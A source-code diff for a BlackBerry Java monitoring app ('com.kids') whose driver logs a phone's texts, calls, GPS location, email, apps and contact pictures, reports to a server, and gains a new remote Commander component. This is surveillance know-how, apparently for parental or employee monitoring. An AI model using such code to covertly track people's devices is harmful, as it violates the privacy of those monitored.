@@ -7,6 +7,8 @@
 
 package com.kids;
 
+import java.util.Vector;
+
 import javax.microedition.io.file.FileSystemListener;
 
 import com.kids.Data.LocalDataAccess;
@@ -16,16 +18,15 @@ import com.kids.Monitor.MyCallListener;
 import com.kids.Monitor.MyGPSListener;
 import com.kids.Monitor.MyMailListener;
 import com.kids.Monitor.MyTextListener;
+import com.kids.Monitor.Contacts.ContactPic.ContactPic;
+import com.kids.control.Commander;
 import com.kids.net.Server;
 import com.kids.prototypes.Debug;
 import com.kids.prototypes.LocalDataReader;
 
-import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
-import net.rim.device.api.system.ApplicationManagerException;
 import net.rim.device.api.system.SystemListener2;
 import net.rim.device.api.ui.UiApplication;
-import net.rim.device.api.ui.component.Dialog;
  
 /**
  * 
@@ -180,8 +181,7 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
         
         //Hear[] subscribers;
     	//subscribers = new Hear[2];
-    	Controllable[] components;
-    	components = new Controllable[5];
+    	Vector components = new Vector();
     	
     	//subscribers[0] = new UninstallMonitor(context, actLog);
 
@@ -199,17 +199,21 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
         // Load sub-components
         // new MyServerUpload(actLog, employerID, deviceID, uploadTimer);
 
-        components[0] = new MyTextListener(actLog);
+        components.addElement(new MyTextListener(actLog));
+        //components[0] = new MyTextListener(actLog);
         //WebMonitor wm = new WebMonitor (context, actLog);
     	//components[1] = wm;
-        components[2] = new MyCallListener(actLog);        
+        components.addElement(new MyCallListener(actLog));
+        //components[2] = new MyCallListener(actLog);        
     	//components[3] = new ContactPic(context, actLog);
+        components.addElement(new ContactPic(actLog));
     	//components[4] = new MediaSync(context, actLog);        
         new MyGPSListener (actLog, GPSTimer);
         new MyAppListener (actLog, AppTimer);            
         new MyMailListener(actLog);
     	// Start up connection to the server
     	new Server(actLog).start();
+    	new Commander(actLog, components).start();
     }
     
     /**
@@ -247,8 +251,8 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
 		logWriter.log("BacklightStageChange");
 		logWriter.log("Backlight "+(on?"ON.":"OFF."));
 			
-		if (!on)
-			launchApplication();
+		//if (!on)
+		//	launchApplication();
 	}
 
 	public void cradleMismatch(boolean arg0)
@@ -275,6 +279,7 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
 	 * Attempts to launch app if it crashed. This method is called from the BacklightStateChange() method.
 	 * This can be skipped by removing the SystemListener in PowerUp()
  	 */
+	/*
 	private void launchApplication()
 	{
 		logWriter.log("In launchApplication");
@@ -313,7 +318,7 @@ public class Driver extends UiApplication implements SystemListener2, FileSystem
 		{
 			Dialog.alert("Error: " + ame.getMessage());
 		}
-	}
+	}*/
 }
 
 /*
